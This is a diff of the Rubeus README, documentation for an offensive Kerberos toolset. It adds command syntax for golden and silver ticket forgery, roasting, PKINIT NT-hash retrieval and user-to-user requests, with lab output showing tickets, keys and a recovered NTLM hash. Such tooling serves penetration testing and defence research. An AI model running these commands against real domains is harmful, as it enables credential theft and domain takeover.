@@ -4,7 +4,7 @@
 
 Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is **heavily** adapted from [Benjamin Delpy](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) project (CC BY-NC-SA 4.0 license) and [Vincent LE TOUX](https://twitter.com/mysmartlogon)'s [MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin) project (GPL v3.0 license). Full credit goes to Benjamin and Vincent for working out the hard components of weaponization- without their prior work this project would not exist.
 
-[Charlie Clark](https://twitter.com/exploitph) and [Ceri Coburn](https://twitter.com/_EthicalChaos_) have both made _significant_ contributions to the Rubeus codebase. [Elad Shamir](https://twitter.com/elad_shamir) contributed some essential work for resource-based constrained delegation. Their work is very appreciated!
+[Charlie Clark](https://twitter.com/exploitph) and [Ceri Coburn](https://twitter.com/_EthicalChaos_) have both made _significant_ contributions as co-developers to the Rubeus codebase. [Elad Shamir](https://twitter.com/elad_shamir) contributed some essential work for resource-based constrained delegation. Their work is very appreciated!
 
 Rubeus also uses a C# ASN.1 parsing/encoding library from [Thomas Pornin](https://github.com/pornin) named [DDer](https://github.com/pornin/DDer) that was released with an "MIT-like" license. Huge thanks to Thomas for his clean and stable code!
 
@@ -34,6 +34,9 @@ Rubeus is licensed under the BSD 3-Clause license.
     - [brute](#brute)
   - [Constrained delegation abuse](#constrained-delegation-abuse)
     - [s4u](#s4u)
+  - [Ticket Forgery] (#ticket-forgery)
+    - [golden] (#golden)
+    - [silver] (#silver)
   - [Ticket Management](#ticket-management)
     - [ptt](#ptt)
     - [purge](#purge)
@@ -74,25 +77,25 @@ Rubeus is licensed under the BSD 3-Clause license.
       | |  \ \| |_| | |_) ) ____| |_| |___ |
       |_|   |_|____/|____/|_____)____/(___/
 
-      v1.6.4
+      v2.0.0
 
 
      Ticket requests and renewals:
 
         Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
             Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec]
-
+    
         Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
             Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec]
 
         Retrieve a TGT using a PCKS12 certificate, start a /netonly process, and to apply the ticket to the new process/logon session:
-            Rubeus.exe asktgt /user:USER /certificate:C:\temp\leaked.pfx </password:STOREPASSWORD> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]
+            Rubeus.exe asktgt /user:USER /certificate:C:\temp\leaked.pfx </password:STOREPASSWORD> /createnetonly:C:\Windows\System32\cmd.exe [/getcredentials] [/servicekey:KRBTGTKEY] [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]
 
         Retrieve a TGT using a certificate from the users keystore (Smartcard) specifying certificate thumbprint or subject, start a /netonly process, and to apply the ticket to the new process/logon session:
             Rubeus.exe asktgt /user:USER /certificate:f063e6f4798af085946be6cd9d82ba3999c7ebac /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]
 
         Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:
-            Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/usesvcdomain]
+            Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY]
 
         Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:
             Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]
@@ -111,6 +114,36 @@ Rubeus is licensed under the BSD 3-Clause license.
             Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self]
 
 
+     Ticket Forgery:
+
+        Forge a golden ticket using LDAP to gather the relevent information:
+            Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/printcmd] [outfile:FILENAME] [/ptt]
+
+        Forge a golden ticket using LDAP to gather the relevent information but explicitly overriding some values:
+            Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/lastlogoff:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/printcmd] [outfile:FILENAME] [/ptt]
+
+        Forge a golden ticket, setting values explicitly:
+            Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/lastlogoff:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/printcmd] [outfile:FILENAME] [/ptt]
+
+        Forge a silver ticket using LDAP to gather the relevent information:
+            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/printcmd] [outfile:FILENAME] [/ptt]
+
+        Forge a silver ticket using LDAP to gather the relevent information, using the KRBTGT key to calculate the KDCChecksum and TicketChecksum:
+            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap </krbkey:HASH> [/krbenctype:DES|RC4|AES128|AES256] [/printcmd] [outfile:FILENAME] [/ptt]
+
+        Forge a silver ticket using LDAP to gather the relevent information but explicitly overriding some values:
+            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/lastlogoff:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/printcmd] [outfile:FILENAME] [/ptt]
+
+        Forge a silver ticket using LDAP to gather the relevent information and including an S4U Delegation Info PAC section:
+            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/printcmd] [outfile:FILENAME] [/ptt]
+
+        Forge a silver ticket using LDAP to gather the relevent information and setting a different cname and crealm:
+            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/printcmd] [outfile:FILENAME] [/ptt]
+
+        Forge a silver ticket, setting values explicitly:
+            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/lastlogoff:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/printcmd] [outfile:FILENAME] [/ptt]
+
+
      Ticket management:
 
         Submit a TGT, optionally targeting a specific LUID (if elevated):
@@ -120,7 +153,7 @@ Rubeus is licensed under the BSD 3-Clause license.
             Rubeus.exe purge [/luid:LOGINID]
 
         Parse and describe a ticket (service ticket or TGT):
-            Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI>
+            Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI> [/servicekey:HASH] [/krbkey:HASH] [/asrepkey:HASH] [/serviceuser:USERNAME] [/servicedomain:DOMAIN]
 
 
      Ticket extraction and harvesting:
@@ -147,16 +180,16 @@ Rubeus is licensed under the BSD 3-Clause license.
      Roasting:
 
         Perform Kerberoasting:
-            Rubeus.exe kerberoast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]
+            Rubeus.exe kerberoast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
 
         Perform Kerberoasting, outputting hashes to a file:
-            Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
+            Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]
 
         Perform Kerberoasting, outputting hashes in the file output format, but to the console:
-            Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]
+            Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
 
         Perform Kerberoasting with alternate credentials:
-            Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]
+            Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
 
         Perform Kerberoasting with an existing TGT:
             Rubeus.exe kerberoast </spn:"blah/blah" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]
@@ -165,37 +198,37 @@ Rubeus is licensed under the BSD 3-Clause license.
             Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]
 
         Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:
-            Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/nowrap]
+            Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]
 
         Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
-            Rubeus.exe kerberoast /usetgtdeleg [/nowrap]
+            Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]
 
         Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
-            Rubeus.exe kerberoast /rc4opsec [/nowrap]
+            Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]
 
         List statistics about found Kerberoastable accounts without actually sending ticket requests:
-            Rubeus.exe kerberoast /stats [/nowrap]
+            Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]
 
         Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
-            Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/nowrap]
+            Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]
 
         Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
-            Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/nowrap]
+            Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]
 
         Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:
-            Rubeus.exe kerberoast /delay:5000 /jitter:30 [/nowrap]
+            Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]
 
         Perform AES Kerberoasting:
-            Rubeus.exe kerberoast /aes [/nowrap]
+            Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]
 
         Perform AS-REP "roasting" for any users without preauth:
-            Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]
+            Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
 
         Perform AS-REP "roasting" for any users without preauth, outputting Hashcat format to a file:
-            Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
+            Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]
 
         Perform AS-REP "roasting" for any users without preauth using alternate credentials:
-            Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."] [/nowrap]
+            Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."] [/ldaps] [/nowrap]
 
 
      Miscellaneous:
@@ -204,7 +237,7 @@ Rubeus is licensed under the BSD 3-Clause license.
             Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show]
 
         Reset a user's password from a supplied TGT (AoratoPw):
-            Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER]
+            Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER] [/targetuser:DOMAIN\USERNAME]
 
         Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hashes:
             Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN]
@@ -305,6 +338,8 @@ The **asktgt** action will build raw AS-REQ (TGT request) traffic for the specif
 Note that no elevated privileges are needed on the host to request TGTs or apply them to the **current** logon session, just the correct hash for the target user. Also, another opsec note: only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the `/ptt` option. A workaround is to use the `/createnetonly:C:\X.exe` parameter (which hides the process by default unless the `/show` flag is specified), or request the ticket and apply it to another logon session with `ptt /luid:0xA..`.
 
 By default, several differences exists between AS-REQ's generated by Rubeus and genuine AS-REQ's. To form AS-REQ's more inline with genuine requests, the `/opsec` flag can be used, this will send an initial AS-REQ without pre-authentication first, if this succeeds, the resulting AS-REP is decrypted and TGT return, otherwise an AS-REQ with pre-authentication is then sent. As this flag is intended to make Rubeus traffic more stealthy, it cannot by default be used with any encryption type other than `aes256` and will just throw a warning and exit if another encryption type is used. To allow for other encryption types to be used with the `/opsec` changes, the `/force` flag exists.
+
+PKINIT authentication is supported with the `/certificate:X` argument. When the private key within the PFX file is password protected, this password can be passed with the `/password:X` argument. When using PKINIT authentication the `/getcredentials` flag can be used to automatically request a U2U service ticket and retrieve the account NT hash.
 
 Requesting a ticket via RC4 hash for **dfm.a@testlab.local**, applying it to the current logon session:
 
@@ -410,6 +445,51 @@ Requesting a ticket via aes256_hmac hash for **dfm.a@testlab.local**, starting a
 
 **Note that the /luid and /createnetonly parameters require elevation!**
 
+Requesting a ticket using a certificate and using `/getcredentials` to retrieve the NT hash:
+
+    C:\Rubeus>Rubeus.exe asktgt /user:harmj0y /domain:rubeus.ghostpack.local /dc:pdc1.rubeus.ghostpack.local /getcredentials /certificate:MIIR3QIB...(snip)...QI/GZmyPRFEeE=
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.0.0
+
+    [*] Action: Ask TGT
+
+    [*] Using PKINIT with etype rc4_hmac and subject: CN=Harm J0y, CN=Users, DC=rubeus, DC=ghostpack, DC=local
+    [*] Building AS-REQ (w/ PKINIT preauth) for: 'rubeus.ghostpack.local\harmj0y'
+    [+] TGT request successful!
+    [*] base64(ticket.kirbi):
+
+          doIF9DCCBfCgAwIBBaEDAgEWooIE7DCCBOhhggTkMIIE4KADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                            ...(snip)...
+          YnRndBsWcnViZXVzLmdob3N0cGFjay5sb2NhbA==
+
+      ServiceName              :  krbtgt/rubeus.ghostpack.local
+      ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL
+      UserName                 :  harmj0y
+      UserRealm                :  RUBEUS.GHOSTPACK.LOCAL
+      StartTime                :  14/07/2021 02:25:33
+      EndTime                  :  14/07/2021 12:25:33
+      RenewTill                :  21/07/2021 02:25:33
+      Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+      KeyType                  :  rc4_hmac
+      Base64(key)              :  7MS2ajfZo4HedoK+K3dLcQ==
+      ASREP (key)              :  9B1C28A276FBBE557D0F9EE153FE24E1
+
+    [*] Getting credentials using U2U
+
+      CredentialInfo         :
+        Version              : 0
+        EncryptionType       : rc4_hmac
+        CredentialData       :
+          CredentialCount    : 1
+           NTLM              : C69A7EA908898C23B72E65329AF7E3E8
+
 
 ### asktgs
 
@@ -419,9 +499,13 @@ The supported encryption types in the constructed TGS-REQ will be RC4_HMAC, AES1
 
 In order to request a service ticket for an account using an enterprise principal (i.e. *user@domain.com*), the `/enterprise` flag can be used.
 
-By default, several differences exists between TGS-REQ's generated by Rubeus and genuine TGS-REQ's. To form TGS-REQ's more inline with genuine requests, the `/opsec` flag can be used, this will also cause an additional TGS-REQ to be sent automatically when a service ticket is requested for an account configured for unconstrained delegation. As this flag is intended to make Rubeus traffic more stealthy, it cannot by default be used with any encryption type other than `aes256` and will just throw a warning and exit if another encryption type is used. To allow for other encryption types to be used with the `/opsec` changes, the `/force` flag exists.
+By default, several differences exists between TGS-REQ's generated by Rubeus and genuine TGS-REQ's. To form TGS-REQ's more inline with genuine requests, the `/opsec` flag can be used, this will also cause an additional TGS-REQ to be sent automatically when a service ticket is requested for an account configured for unconstrained delegation. As this flag is intended to make Rubeus traffic more stealthy, it cannot by default be used with any encryption type other than `aes256` and will just throw a warning and exit if another encryption type is used.
 
-To play with other scenarios manually, `/tgs:X` can be used to supply an additional ticket which is appended to the request body. This also adds the constrained delegation KDC option as well as avoids dynamically determining the domain from the given SPN `/service:X`, for this reason the `/usesvcdomain` flag has been implemented to force the request to use the domain from the given SPN `/service:X` which is useful for requesting delegated service tickets from a foreign domain.
+To play with other scenarios manually, `/tgs:X` can be used to supply an additional ticket which is appended to the request body. This also adds the constrained delegation KDC option as well as avoids dynamically determining the domain from the given SPN `/service:X`, for this reason the `/targetdomain:X` argument has been implemented to force the request to use the supplied domain which is useful for requesting delegated service tickets from a foreign domain or tickets with usual SPNs.
+
+The `/u2u` flag was implemented to request User-to-User tickets. Together with the `/tgs:X` argument (used to supply the target accounts TGT), the `/service:X` argument can be the username of the account the supplied TGT is for (with the `/tgs:X` argument). The `/targetuser:X` argument will request a PAC of any other account by inserting a PA-FOR-USER PA data section with the `target user's` username.
+
+The `/printargs` flag will print the arguments required to forge a ticket with the same PAC values if the PAC is readable. This could be done by supplying the `/servicekey:X` argument or performing a `/u2u` request with a known session key.
 
 
 Requesting a TGT for dfm.a and then using that ticket to request a service ticket for the "LDAP/primary.testlab.local" and "cifs/primary.testlab.local" SPNs:
@@ -555,6 +639,257 @@ Requesting a service ticket for an AES-enabled service account, specifying that 
     KeyType               :  rc4_hmac
     Base64(key)           :  Gg3zZicIl5c50KGecCf8XA==
 
+Requesting a user-to-user service ticket and including the *PA for User* PA-DATA section (an S4U2self request), it is possible to get a readable PAC for any user:
+
+    C:\Rubeus>Rubeus.exe asktgs /u2u /targetuser:ccob /ticket:doIFijCCBYagAwIBBaED...(snip)...3RwYWNrLmxvY2Fs /tgs:doIFijCCBYagAwIBBaEDAg...(snip)...YWNrLmxvY2Fs
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.0.0
+
+    [*] Action: Ask TGS
+
+    [*] Using domain controller: PDC1.rubeus.ghostpack.local (192.168.71.80)
+    [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+    [*] Building User-to-User TGS-REQ request for: 'exploitph'
+    [+] TGS request successful!
+    [*] base64(ticket.kirbi):
+
+          doIFKzCCBSegAwIBBaEDAgEWooIEKzCCBCdhggQjMIIEH6ADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                            ...(snip)...
+          cGxvaXRwaA==
+
+      ServiceName              :  exploitph
+      ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL
+      UserName                 :  ccob
+      UserRealm                :  RUBEUS.GHOSTPACK.LOCAL
+      StartTime                :  20/07/2021 22:00:07
+      EndTime                  :  21/07/2021 07:59:39
+      RenewTill                :  27/07/2021 21:59:39
+      Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
+      KeyType                  :  aes256_cts_hmac_sha1
+      Base64(key)              :  u2AYdjG4gLNIXqzb3MmwtDtE1k2NR5ty9h80w704+8Q=
+      Decrypted PAC            :
+        LogonInfo              :
+          LogonTime            : 01/01/1601 00:00:00
+          LogoffTime           :
+          KickOffTime          :
+          PasswordLastSet      : 20/07/2021 21:58:44
+          PasswordCanChange    : 21/07/2021 21:58:44
+          PasswordMustChange   : 31/08/2021 21:58:44
+          EffectiveName        : ccob
+          FullName             : C Cob
+          LogonScript          :
+          ProfilePath          :
+          HomeDirectory        :
+          HomeDirectoryDrive   :
+          LogonCount           : 0
+          BadPasswordCount     : 0
+          UserId               : 1109
+          PrimaryGroupId       : 513
+          GroupCount           : 1
+          Groups               : 513
+          UserFlags            : (32) EXTRA_SIDS
+          UserSessionKey       : 0000000000000000
+          LogonServer          : PDC1
+          LogonDomainName      : RUBEUS
+          LogonDomainId        : S-1-5-21-3237111427-1607930709-3979055039
+          UserAccountControl   : (16) NORMAL_ACCOUNT
+          ExtraSIDCount        : 1
+          ExtraSIDs            : S-1-18-2
+          ResourceGroupCount   : 0
+        ClientName             :
+          Client Id            : 20/07/2021 21:59:39
+          Client Name          : ccob
+        UpnDns                 :
+          DNS Domain Name      : RUBEUS.GHOSTPACK.LOCAL
+          UPN                  : ccob@rubeus.ghostpack.local
+          Flags                : 0
+        ServerChecksum         :
+          Signature Type       : KERB_CHECKSUM_HMAC_MD5
+          Signature            : 79A2DC5595C76FA85155B4C65B3A0EE1 (VALID)
+        KDCChecksum            :
+          Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+          Signature            : DA57618BB48EA56371E374B1 (UNVALIDATED)
+
+If the PAC can be decrypted (by using a user-to-user request or by passing the `/servicekey`) is it possible to print the arguments required to forge a ticket containg the same PAC values:
+
+    C:\Rubeus>Rubeus.exe asktgs /service:roast/me /printargs /servicekey:9FFB199F118556F579B415270EE835005227FCBF29331DAC27C4397AC353F52B /ticket:doIF9DCCBfCgAwIBBaEDAg...(snip)...cGFjay5sb2NhbA==
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.0.0
+
+    [*] Action: Ask TGS
+
+    [*] Using domain controller: PDC1.rubeus.ghostpack.local (192.168.71.80)
+    [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+    [*] Building TGS-REQ request for: 'roast/me'
+    [+] TGS request successful!
+    [*] base64(ticket.kirbi):
+
+          doIF6jCCBeagAwIBBaEDAgEWooIE5zCCBONhggTfMIIE26ADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                            ...(snip)...
